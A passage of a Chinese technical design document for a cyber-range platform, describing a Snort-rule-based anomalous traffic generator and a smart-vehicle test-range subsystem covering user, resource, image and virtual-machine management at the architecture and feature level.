描述语言来表征某种新的网络攻击。根据新编写的Snort规则，结合本文设计框架，即可生成新的异常流量，满足需求中的可扩展性要求。</p><h5 id="系统设计"><a href="#系统设计" class="headerlink" title="系统设计"></a>系统设计</h5><h6 id="流量生成原理"><a href="#流量生成原理" class="headerlink" title="流量生成原理"></a>流量生成原理</h6><p>本文异常流量生成系统的基本思想是通过网络协议头特征和负载信息构造异常流量数据包，通过数据包发送时间间隔控制数据包发送过程，最终得到网络异常流量。其基本原理如下图所示。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/d3c2871145b7d41cdacbfe0e94f3b659.png"></p><p>网络常流量生成系统设计原理</p><p>结合异常流量生成需求和系统设计原理，提出了一种基于时空模型的网络异常流量生成机制框架，如下图3-2所示。框架由特征翻译模块、数据包构造模块和流量生成模块构成。其中，特征翻译模块用与解析异常流量特征库，获取网络协议头和数据包负载特征字段，交由数据包构造模块构造异常流量数据包。流量生成模块接收流量时间参数，控制数据包发送过程，产生网络异常流量。框架中各个功能模块独立具有如下优点：①解耦合的功能模块便于系统的开发实现；②各独立模块在维护上十分容易。</p><h6 id="流量生成框架"><a href="#流量生成框架" class="headerlink" title="流量生成框架"></a>流量生成框架</h6><p>下图为流量生成框架。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/057d034c32953d539ff0741460e0639d.png"></p><p>基于时空模型的网络流量生成机制框架</p><p>框架中输入为网络异常流量特征库和流量时间参数，输出即为所需的网络异常流量。</p><p>框架中各部分功能详细描述如下：</p><p>（1）异常流量特征库：该特征库是对一系列异常流量特征进行描述的信息库。可以是一个数据库表也可以是一个描述性文件，具体取决于实现的便利性。流量库可以持续更新，保证系统生成流量的丰富性。</p><p>（2）特征解析引擎：该引擎主要功能是完成对异常流量特征的解析工作。如果异常流量特征库是一个数据库表，则该引擎需要识别每个字段并取出该字段的值，用于构造数据报文；如果异常流量特征库是一个描述性文件，那么该引擎还需要具备语言解析功能，即完成异常流量特征描述语言向机器能够识别语言的转换。此部分为系统架构的核心模块之一。</p><p>（3）特征描述文法：特征描述文法即异常流量特征的规范化描述文法，如BNF或是EBNF的范式描述，它是异常流量特征库解析的依据。</p><p>（4）数据包构造引擎：该引擎是完成数据包构造的关键部件。它接收来自流量特征解析引擎获取到的特征字段，获取特征字段取值，调用数据包构造函数完成不同类型数据包的构造。</p><p>（5）数据包构造函数库：数据包构造函数库通过统一接口，为数据包构造引擎提供所需的函数。目前可供网络开发者使用的开发包非常多，所以该部分可以采用第三方开发包。</p><p>（6）流量时间参数：该时间参数用于控制构造好的数据包以何种时间模型发送以及流量持续时长。</p><p>（7）流量发生器：流量发生器来自数据包构造引擎编译之后产生的可执行文件，该可执行文件包含了数据报文的各种空间特征，同时接受用户输入的时间特征参数，根据这些参数发送数据包产生异常流量。</p><p>（8）异常流量：实验输出结果，以pcap格式存储，可以通过tcpreplay[50]等攻击进行重放，添加至网络靶场中。</p><h6 id="方案配置"><a href="#方案配置" class="headerlink" title="方案配置"></a>方案配置</h6><p>（一）硬件配置</p><p>6个测试端口。</p><p>4个10GESFP+接口，兼容1/10G速率模式。</p><p>2个QSFP28接口，兼容1/10/25G速率模式。</p><p>2个10/100/1000M自适应网口用于管理。</p><p>机架式设计，适应标准机架安装。</p><p>交流电压：220（1±10%）V，频率50（1±5%）Hz。</p><p>（二）软件功能</p><p>管理方式：基于B/S架构，支持多用户同时在线管理。</p><p>标准测试支持：支持RFC 2544、RFC 2889、RFC 3511、RFC 4445等多项标准测试。</p><p>协议模拟：包含常见互联网协议、视频协议、组播协议、动态路由协议、工业互联网协议及车载以太网协议等。</p><p>仿真覆盖层次：L2-L7层协议仿真。</p><p>网络支持：兼容IPv4和IPv6网络。</p><p>被测设备类型：支持路由器、交换机、防火墙等多种设备的测试。</p><p>国密算法测试：支持国密算法HTTPS和VPN性能测试。</p><p>DDoS攻击与安全测试：支持DDoS攻击模拟、漏洞扫描、安全检测评估等。</p><p>用户模拟：能够模拟百万级用户同时进行业务操作。</p><p>（三）实施步骤</p><p>硬件采购与组装：根据性能需求采购相应硬件并组装。</p><p>软件开发与集成：</p><p>开发仿真引擎和管理界面。</p><p>集成网络安全与基准测试功能。</p><p>系统测试：对系统的每项功能进行测试，确保性能符合要求。</p><p>（五）技术选型</p><p>仿真技术：采用先进的流量生成和分析技术，模拟真实网络环境。</p><p>前端技术：使用现代Web技术栈，如React或Vue.js，构建用户界面。</p><p>后端技术：利用高性能的后端框架，如Node.js或Python Flask，提供稳定的API服务。</p><h6 id="Snort规则解析流程"><a href="#Snort规则解析流程" class="headerlink" title="Snort规则解析流程"></a>Snort规则解析流程</h6><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/010043c8db910a0122cabfb448e04e1f.png"></p><p>Snort规则解析流程</p><p>特征翻译模块首先对Snort规则文件进行预处理，将Snort规则库存储为以sid命名的Snort规则文件。选取规则文件，通过基于ANTLR词法分析器识别各规则选项的token值，并将其值域存入规则结构体。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/a727e69e50cbfa3c502592241a8b7fed.png"></p><p>流量生成详细构造</p><p>整个系统分为三个模块：特征翻译模块、数据包构造模块和流量生成模块。</p><p>特征翻译模块首先对Snort规则文件进行预处理，将Snort规则库存储为以sid命名的Snort规则文件。选取规则文件，通过基于ANTLR词法分析器识别各规则选项的token值，并将其值域存入规则结构体。</p><p>数据包构造模块读取规则结构体，获取报文各字段取值，使用Libnet构造数据包，编译生成流量发生器（可执行文件），交给流量生成模块。</p><p>流量生成模块根据输入的攻击强度和攻击持续时间，选择不同的流量模型，计算数据包发送时间间隔，在时间到达时，执行流量发生器，将构造的数据报文从网络链路层直接发送到网络上去，形成网络流量。</p><h5 id="系统截图"><a href="#系统截图" class="headerlink" title="系统截图"></a>系统截图</h5><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/ad4ed4604ea4438b06cb65beb7b09625.png"></p><p>网络异常流量生成演示系统指引界面</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/6642ab9090aba4ff9e6501ade3f89ac3.png"></p><p>流量生成页面</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/9918f9bcd39ec626e01e3c71d9f34e8c.png"></p><p>数据报文构造页面</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/60c47447ebdfa28e6691d8f5546d5541.png"></p><p>流量生成截取结果</p><h1 id="智能汽车网络靶场试验支撑分系统"><a href="#智能汽车网络靶场试验支撑分系统" class="headerlink" title="智能汽车网络靶场试验支撑分系统"></a>智能汽车网络靶场试验支撑分系统</h1><h2 id="技术路线-1"><a href="#技术路线-1" class="headerlink" title="技术路线"></a>技术路线</h2><h3 id="人员管理模块"><a href="#人员管理模块" class="headerlink" title="人员管理模块"></a>人员管理模块</h3><h4 id="功能实施方案-6"><a href="#功能实施方案-6" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p>1） 提供的人员管理模块采用统一且集中的权限管理体系，确保所有操作均由管理员统一进行管理和监控。支持为每个人员配置详细的单位属性，以满足不同组织结构的需求。此外，平台管理员拥有根据单位属性划分平台资源的权限，可以灵活分配包括虚拟CPU、内存、磁盘空间及虚拟机数量等在内的各类资源，确保资源的合理分配和高效利用。截图见“产品功能截图”部分</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/1bbfb470066c9fa388d24052284d3723.png" alt="企业微信截图_17053318524304"></p><p>2） 模块支持对系统用户的账号、单位、角色进行细致管理。系统提供全面的用户账号管理功能，允许管理员对系统用户的账号、所属单位和角色进行细致入微的管理。管理员能够自定义系统中的角色名称，并为每个角色设定访问权限，确保用户只能访问其权限范围内的内容和功能。系统支持管理员自定义角色名称和权限，提供灵活性以适应不同的管理需求和安全策略。系统权限管理支持基于角色的访问控制模型，其中角色被赋予一定的权限，用户被分配到不同的角色，从而实现了对各种操作和资源的细致控制。实现包括权限分配、角色分配、用户角色关联等技术细节。截图见“产品功能截图”部分</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/cb7ec0c0588361440b8619791e44cabc.png"></p><p>单位组织、账号、权限设置</p><p>3） 系统支持用户单位的管理，包括创建用户所在单位、修改用户所在单位、配置和修改单位可使用的资源总量。虚拟化技术用于资源的细分，资源池被分成各单位的资源子池。每单位获得特定的资源配额，如虚拟CPU、内存、磁盘大小和虚拟机数量。资源分配和管理借助虚拟机管理器（如Hypervisor），确保资源的隔离与共享。资源调度算法动态分配资源以提高资源利用效率，保障不同单位独立性和资源分配策略的有效执行。</p><p>4） 支持用户在线状态的查看与密码重置，支持批量启用用户和批量禁用用户，系统通过用户管理界面选定指定的用户进行批量启用和禁用操作，密码存储设计用密码哈希算法和加密存储技术保障密码安全性，通过重新生成新密码的方式实现密码重置。在线状态查看通过实时数据同步和数据库查询实现，系统及时反映用户登录状态，提供准确信息，确保用户管理模块的稳定性和安全性。</p><h4 id="性能实施方案-6"><a href="#性能实施方案-6" class="headerlink" title="性能实施方案"></a>性能实施方案</h4><p>1） 人员管理模块具备支持管理的人员数量不低于500人的能力。该模块的设计和实现考虑了大规模的人员管理需求，确保系统可以轻松地处理和管理500人及以上的用户群体。这包括了高效的数据存储结构、快速的查询和操作性能，以及用户界面的优化，以满足大型组织或平台的管理需求。模块的可伸缩性和性能优化确保了系统可以应对大规模人员管理的挑战，同时保持了操作的稳定性和准确性。。</p><h4 id="技术实现内容-6"><a href="#技术实现内容-6" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><p>功能参数设计方面，平台实现了统一的权限管理体系，由管理员负责统一管理。管理员可以配置每个人员的单位属性，并根据单位进行资源的划分，包括虚拟CPU、内存、磁盘大小、虚拟机数量等。此外，系统支持对系统用户的账号、单位、角色进行管理，管理员可以自定义系统中角色的名称及其访问权限。还支持用户所在单位的管理，包括修改用户所在单位和配置单位可使用的资源总量。系统还具备查看用户在线状态、密码重置以及批量启用和禁用用户的功能。这些功能确保了平台的安全性和管理的灵活性。</p><p>性能参数设计方面，平台能够支持管理数量达到500人。平台可以满足较大规模的人员管理需求，保证了管理效率和用户体验。</p><p>用户管理负责提供整个系统的用户、用户角色、单位、权限分配和用户日志的管理。主要包括管理人员、设计人员和试验人员三类角色对系统接口、菜单和资源权限的配置管理。</p><p>在试验配置管理中共有三类用户，第一类是管理员，第二类是工程负责人，第三类是普通试验人员。因此管理人员一般为工程负责人角色。管理员作为超级管理员对所有用户进行统一管理。在普通实验人员中又分为了设计人员和具体试验操作人员。设计人员可以进行试验场景设计，而试验操作人员则只能按照试验要求进行具体的试验操作。</p><p>每种角色对应有其权限，每个用户可以赋予为某种角色，该用户就具备该角色可执行的权限。系统管理员支持对角色权限的配置功能。</p><p>对于试验角色权限，通过系统定制化角色权限，用户只具有某种角色的使用权限。</p><p>系统支持多单位、多角色的人员管理，支持对单位、角色、人员的权限进行管理。支持人员接入配置。提供两种视图进行接入配置，一种是以人员为基础，进行设备分配，另一种是以设备为基础进行人员分配。两种方式均支持在分配的时候选择是否进行录屏操作、默认是否可以接入等配置。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/23aeca0f0428c00e83ee210413fc7574.png"></p><p>人员接入配置</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/c1b4dfd38c0fa78c433f181e705da8d0.png"></p><p>设备服务配置</p><p>支持人员接入任务配置。配置参数包括操作（接入、断开）、人员设备数据以及描述等字段。支持通过子系统管理平台Web页面对租户虚拟链路层网络进行管理，包括未知单播报文抑制、未知组播报文抑制、虚拟交换机泛洪学习、MAC地址信息通告、ARP处理模式等进行配置。子系统支持对租户虚拟端口、端口组、安全策略、应用集群虚IP、泛红域等进行管理。</p><p>采用了统一的权限管理体系平台，由管理员统一进行管理。管理员可以配置每个人员的单位属性，并根据单位划分可使用的平台资源数量。这些资源包括虚拟CPU数量、内存大小、磁盘容量以及虚拟机数量等。</p><p>如下图所示。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/7aedb9abc6c31b256cacce56dbe12484.jpeg" alt="WPS图片(18)"></p><p>权限管理</p><h3 id="资源管理模块"><a href="#资源管理模块" class="headerlink" title="资源管理模块"></a>资源管理模块</h3><h4 id="功能实施方案-7"><a href="#功能实施方案-7" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p>1）系统提供汽车全生命周期安全资产管理，覆盖至少14种安全资产类型。这包括靶场测试零部件的硬件平台、操作系统内核、固件、中间件、应用程序版本信息，及被测整车的品牌、车型、车辆、车型项目（年款）、零部件的硬件平台、操作系统内核、固件、中间件、应用程序版本。系统管理包括镜像、靶标、攻防工具、场景模板的四种基础平台虚拟资源。复杂的数据模型确保资产间关联性和完整性，数据管理和关联功能支持实时更新资产信息。虚拟资源管理采用云平台虚拟化技术，实现资源隔离与共享，并通过资源调度算法优化资源利用。此外，系统还包含高级安全措施，保护资产数据安全，预防未授权访问。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/23afdc9fb59a02f9e415bfa968da1951.png"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/f9bec8ac46042ecabd94c236178e8008.png"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/ff35c803b939ac608009a6c727e0835b.png"></p><p>四种基础平台虚拟资源</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/a0641b1f5d32395201a5d3f5c23f7439.jpeg" alt="WPS图片21"></p><p>资源管理</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/dd2f438c89f580d9657c374e000cc52a.png"></p><p>工具管理</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/4491ed6a6fae87ce68038e604d44f4cc.png"></p><p>工具管理</p><p>在现代汽车制造业中，随着智能化技术的持续进步，汽车安全成为了一个多层面的领域，在产品生命周期的各个阶段均需考虑。以确保从设计、制造、使用到维修等全周期内的信息安全和物理安全得到保障。在这样的背景下，对汽车全生命周期的安全资产管理变得尤为重要。安全资产管理平台的建立至少需要包含以下14种安全资产的管理：</p><p>首先，靶场测试零部件的硬件平台管理涉及到测试环境中使用的所有硬件资源。包括但不限于传感器、控制器、通信模块等。对这些硬件平台进行详尽的登记、监控和更新，是确保测试结果有效性的基础。</p><p>操作系统内核版本信息的管理对于确保系统安全十分。操作系统是车载信息系统的中枢，是支持所有应用运行的基础。内核版本的更新和漏洞修补是防御外部攻击的第一道防线。</p><p>固件版本管理涉及到每个零部件的软件层面。汽车中的每个电子设备都有自己的固件来控制其运行，固件的漏洞可能导致安全隐患，因此需要及时进行更新固件。</p><p>中间件版本管理是安全资产管理的另一关键部分，因为中间件为不同的软件提供了一种沟通机制。若中间件存在缺陷，则可能影响到车载系统的整体安全性。</p><p>应用程序版本管理同样重要，因为用户交互最多的就是应用程序。确保应用程序的稳定性和安全性，能够预防潜在的攻击和故障。</p><p>在被测整车层面，品牌管理是保护品牌声誉和避免伪造的重要手段。车型、车辆以及车型项目（年款）的管理，则是为了详细记录每一款车的安全特性，确保它们各自满足特定的安全标准。</p><p>在整车的安全资产管理中还包含车辆内部零部件的硬件平台、操作系统内核版本信息、固件版本、中间件版本、应用程序版本等，这与靶场测试零部件的管理相似，但应用范围扩展到了整个车辆。</p><p>基础平台系统中的虚拟资源管理同样不可忽视。至少应包含以下4种：</p><p>镜像管理，它能够使测试环境快速部署和还原，提高测试效率，同时也是版本控制的一个重要方面。</p><p>靶标管理，这是攻防模拟中不可缺少的一部分。通过虚拟化技术创建的测试目标（靶标），可供安全测试使用，以检验系统漏洞和防御能力。</p><p>攻防工具的管理是为了控制这些工具的合规使用并确保它们的更新与效力，以适应不断演变的网络威胁。</p><p>场景模板管理，确保安全测试人员可以模拟各种实际交通和网络场景，对车辆的反应和处理能力进行全面检测。</p><p>除了上述所述的安全资产管理内容，还需要考虑到安全策略、法规遵从、持续监控、风险评估与应急响应等方面。在整个安全资产的生命周期内，从识别、分类、维护到处置各个环节都应该基于结构化和标准化的流程，以保证信息的整合性和可操作性。</p><p>实施有效的安全资产管理，除了需要有针对性的技术解决方案，还需依赖于人员的培训和意识提升。安全相关的人员应具备系统的知识结构，从硬件到软件，从测试环境到真实世界的应用场景，都要能够掌握相关安全资产的管理与操作。</p><p>安全资产管理平台不仅是一个技术工具，它还需要与企业的业务流程、政策和文化融合，从而构建起一个全面、综合性的汽车安全资产管理体系。这样的体系能够确保在汽车全生命周期中的每一个环节，都能对抗潜在的安全威胁，减轻安全事故带来的风险，最终保障消费者和公众的利益。</p><p>2）镜像资源管理功能允许管理员执行多种操作，包括镜像的添加、删除和导入。镜像资源管理功能在智能汽车网络靶场试验支撑分系统中得到了全面支持,这涵盖了对镜像名称、大小、虚拟化类型、接入用户密码信息、驱动类型等关键信息的管理。些信息为用户提供了全面的镜像资源视图，便于用户根据实际需求进行灵活管理和操作,管理员能够灵活地维护和更新镜像资源，以满足系统的需求，并确保镜像的可用性和安全性。</p><p>3）模块支持物理设备管理，包括对连接到虚实互连交换机端口上的实物设备的注册和管理。这一功能使管理员能够实时监控和维护物理设备的状态，确保设备的正常运行，并进行必要的配置和管理操作。这有助于提高系统的稳定性和性能，同时增强了对物理设备的控制和安全性。</p><p>4）系统具备靶场工程管理功能，支持查看工程占用的资源数量及对工程执行删除、清空等操作。工程管理是智能汽车网络靶场试验支撑分系统的核心功能之一。系统提供了工程管理界面，用户可以查看每个工程占用的资源数量，并根据需要进行删除或清空操作,工程管理功能通过高效的资源监控和管理界面实现，使用户能够轻松管理靶场工程及其资源使用情况。截图见“产品功能截图”部分</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/c5aed52b9302ad5d1e54b3e1f7be24b2.png" alt="WPS图片(121)"></p><ol><li>资源管理模块支持学习资源的管理，包括课程、实验、视频、客观题、主观题、试卷、指导书等，方便用户对各种学习资源进行统一管理。管理方式包含查看资源状态、修改权限以及删除资源等操作，提高了资源管理的灵活性和安全性。用户可以根据需要查看资源状态、修改权限或删除不需要的资源，从而实现学习资源的灵活配置和高效利用。</li><li>系统支持虚拟化设备的配额管理功能，涵盖对虚拟CPU、磁盘总量、内存总量等配额参数的管理。系统允许用户根据实际需求设置虚拟化设备的配额参数，配额管理通过先进的虚拟化技术和资源监控机制实现，确保资源分配的合理性和系统性能的最优化。这一功能确保了虚拟化设备资源的合理分配和高效利用，避免了资源的浪费或不足。</li></ol><p>7）系统提供流量资源管理，支持用户上传流量包数据用于回放和测试。流量管理功能采用数据上传和处理机制，确保测试流量的准确性和可用性。以便用户进行网络流量分析和研究。这一功能为用户提供了便捷的网络流量管理手段，有助于提升网络靶场试验的准确性和可靠性。</p><p>8）提供1000M的网络专线服务，确保高速稳定的网络连接。并提供固定IP地址配置，以适应靶场对外开放活动的需求，包括众测、联邦靶场演练等,该专线服务足以支撑包括众测、联邦靶场演练等在内的多种活动，并确保了活动的顺利进行。提供的专线服务累计时长保证6个自然月的累计时长，确保长期稳定的网络支持。</p><h4 id="性能实施方案-7"><a href="#性能实施方案-7" class="headerlink" title="性能实施方案"></a>性能实施方案</h4><p>1）资源管理模块支持管理的镜像数量不低于1000个，这些镜像分为不同类别，包括系统基础镜像、常用应用镜像和漏洞镜像。具体包括不少于50个系统基础镜像，这些镜像包含了各种操作系统和配置选项，用于构建不同类型的虚拟机环境。另外，资源管理模块还支持至少100个常用应用镜像，这些镜像包括了常见的应用程序和工具，可用于快速部署和测试各种应用场景。最后，资源管理模块还维护至少300个漏洞镜像，这些镜像用于模拟和测试系统的安全漏洞和弱点，以帮助提高系统的安全性和防御能力。这些镜像的管理确保了系统的灵活性和可用性，同时支持各种不同的开发和测试需求。</p><h4 id="技术实现内容-7"><a href="#技术实现内容-7" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><p>功能参数设计方面，平台提供了全面的汽车安全资产管理功能，包括14种不同类型的安全资产管理，涵盖了靶场测试零部件的硬件平台、操作系统内核版本信息、固件版本、中间件版本、应用程序版本等信息。此外，还包括基础平台系统中的4种虚拟资源管理，如镜像、靶标、攻防工具和场景模板等。可以对这些安全资产进行添加、删除、导入等操作，确保安全资产的完整管理。</p><p>在镜像资源管理方面，平台支持镜像的添加、删除和导入，可以管理镜像的相关信息，包括镜像名称、大小、虚拟化类型、接入密码信息以及驱动类型等。</p><p>此外，平台还提供了物理设备管理功能，支持虚实互连交换机端口上连接的实物设备的注册。它还能够管理靶场工程，包括查看工程占用资源的数量，删除和清空工程等操作。学习资源的管理也得到了支持，包括课程、实验、视频、客观题、主观题、试卷和指导书等，可以查看状态、修改权限和删除资源。</p><p>虚拟化设备的配额管理是平台的一项重要功能，可以管理虚拟CPU、磁盘总量、内存总量等配额参数，以便对资源进行有效分配。此外，平台还支持流量资源的管理，允许上传流量包数据，用于回放等用途。</p><p>性能参数设计方面，平台支持管理镜像数量高达1000个，其中包括50个系统基础镜像和100个常用应用镜像，还配置了300个漏洞镜像，确保了资源管理的充分性和多样性。</p><p>试验管理支撑仿真网络环境运行的物理设备，包括支撑虚拟化的物理主机和交换机，以及以实物的方式接入到仿真网络环境中去的设备，并管理支撑虚拟化的物理主机的计算资源和网络资源，虚拟试验用的仿真网络环境，配置所管理的实物设备，构建高逼真度的仿真网络环境。虚拟资源管理提供对仿真虚拟节点的支撑能力，并支持虚拟节点之间的网络连接以及虚拟节点与实物节点之间的网络连接，支撑对虚拟机节点的访问。</p><p>试验资源管理包括虚拟节点和服务管理、虚拟网络支撑扩展、虚拟机访问、和实物靶标管理四个部分。主要功能描述如下：</p><p>（1）具备虚拟网络配置管理能力。支持对网络拓扑结构的通用描述，包括子网、子网间的访问规则、网络节点、网络节点的连接规则、网络节点的外网访问规则等；支持通过网络拓扑结构的通用描述生成仿真网络环境，包括子网、网络节点及其的访问控制规则；</p><p>（2）具备虚拟镜像的管理能力。提供对虚拟镜像的集中存储管理，提供虚拟镜像的上载、下载功能，提供虚拟镜像的编辑工具；提供构建虚拟网络所必需的各类主流操作系统基础镜像，包括典型的Windows系列、Linux系列；提供按虚拟机实例创建虚拟镜像的功能，以扩展虚拟机镜像库；</p><p>（3）具备虚拟节点的加载、运行与调度管理等支持能力。支持KVM等主流的虚拟化技术，以开源软件为主进行硬件设备虚拟化，便于功能扩展，支持虚拟网络节点的动态启动、暂停/恢复、重启等；支持设置虚拟机的登录口令的注入，支持虚拟机运行状态的监控，能从崩溃中自动恢复到初始状态；</p><p>（4）具有轻量级的网络节点仿真能力。支持HTTP、UDP、TCP、ICMP、SSH、TELNET等基础协议仿真，能够与真实软件通信；支持交换机、路由器仿真，支持静态路由配置；</p><p>（6）提供对虚拟网络节点访问的支持能力。提供对虚拟机节点的远程桌面支持能力；提供对虚拟机节点访问的可配置的录屏/回放功能；</p><p>（7）提供将实物设备接入虚拟网络并实现透明连接，通常需要使用特定的网络虚拟化技术和设备，比如以下方法：</p><p>网络虚拟化平台：使用如V Open vSwitch等网络虚拟化平台可以将物理设备与虚拟网络相连。这些技术通常支持创建虚拟交换机、路由器等，允许物理设备透明地成为虚拟化环境的一部分。</p><p>（8）具备系统资源与试验资源的存储管理能力，可进行系统资源的注册、查询修改，支持按类型、名称、来源等条件检索各种资源；可进行试验数据、态势要素的存储、检索、查询等，能够兼容、导入不同格式的试验数据，并可根据数据类型将其以多种格式导出（dmp/sdf/txt/xml等）；综合使用关系型数据库和NoSQL类数据库，对于采集数据采用NoSQL类数据库进行存储；数据库支持PB级别的海量存储，具备可扩展性，能够进行纵向和横向的扩展，具备备份恢复机制。</p><h5 id="虚拟机管理"><a href="#虚拟机管理" class="headerlink" title="虚拟机管理"></a>虚拟机管理</h5><p>系统可实现对虚拟机的所有生命周期管理相关操作（创建、启动、暂停、恢复、休眠、重启、安全关闭、强制关闭、删除、克隆、迁移、备份、快照、克隆为模板等常用生命周期管理操作），虚拟机迁移路径等进行日志监控收集，方便事后审计追踪。</p><p>支持批量修改虚拟机的配置参数，包括：I/O优先级、启动优先级、是否自动迁移、CPU调度优先级、CPU个数、内存大小、自动启动、启用VNC代理、tools自动升级等。</p><p>支持对系统中虚拟资源、物理资源的管理，虚拟资源包括攻防工具、场景模板、镜像、靶标等；可以方便地进行镜像的删除和导入、添加操作。在镜像资源的管理过程中，可以获取详细的镜像信息，包括镜像虚拟化类型、名称、大小、接入用户密码信息和驱动类型等关键属性。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/a0641b1f5d32395201a5d3f5c23f7439.jpeg" alt="WPS图片21"></p><p>：资源管理</p><p>系统持管理大量的镜像资源，包括不少于1000个镜像的管理和配置。其中系统基础镜像的数量不少于50个，常用应用镜像的数量不少于100个，漏洞镜像的数量也不少于300个。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/b38399a2626d85877fcaba0cfb589997.jpeg" alt="WPS图片(22"></p><p>虚拟机管理</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/e3cac3b876f877f1024bdcb2a5c80e71.png"></p><p>批量修改界面</p><p>VNC代理功能功能在配置linux功能时开启。</p><p>支持将虚拟机在线克隆为模板，模板制作过程中对业务运行无影响，同时虚拟机模板支持完整性验证与来源追溯，避免虚拟机模板文件被篡改的可能性，并追踪虚拟机模板的来源以及虚拟机模板部署的记录。</p><p>在单台物理机上运行100个虚拟机情况下，能够支持100个虚拟机进程调度最大延迟平均时间10us;（提供利用perf -sched命令测试的虚拟机进程调度延迟截图，100个虚拟机进程的调度最大延迟(Maximum delay ms）时间的平均值不超过0.01ms）。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/c9cd8ae880552d619228b4b0007d6d34.jpeg" alt="D:\\1.CyberSecurity\\文档修改\\六所靶场\\六所2021.3.29\\延迟xiugai.jpg"></p><p>部署延迟</p><h5 id="虚拟机ACL配置"><a href="#虚拟机ACL配置" class="headerlink" title="虚拟机ACL配置"></a>虚拟机ACL配置</h5><p>系统支持虚拟机的入方向、出方向、出入方向安全访问控制功能，可基于IP、MAC、端口号、时间段等设置访问规则。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/1b70f57dfe2eb1a88602a46ebf0213d2.png"></p><p>基于时间段ACL</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/0c37d7d0874f2900d2e6979c967326c2.png"></p><p>基于MAC ACL</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/1a8b8785924ccfa47afb839289f2a3ba.png"></p><p>基于IP ACL</p><h5 id="虚拟机部署"><a href="#虚拟机部署" class="headerlink" title="虚拟机部署"></a>虚拟机部署</h5><p>系统在部署虚拟机的时候支持批量部署：基于虚拟机模板一次性批量部署大量的虚拟机，虚拟机可以指定在某一台物理主机，也可以指定为集群内自动均衡分布。</p><p>提供虚拟机回收站功能，防止因虚拟机误删除导致数据丢失，支持设置回收站文件保存周期，超期的文件将被自动删除，支持批量销毁或还原虚拟机 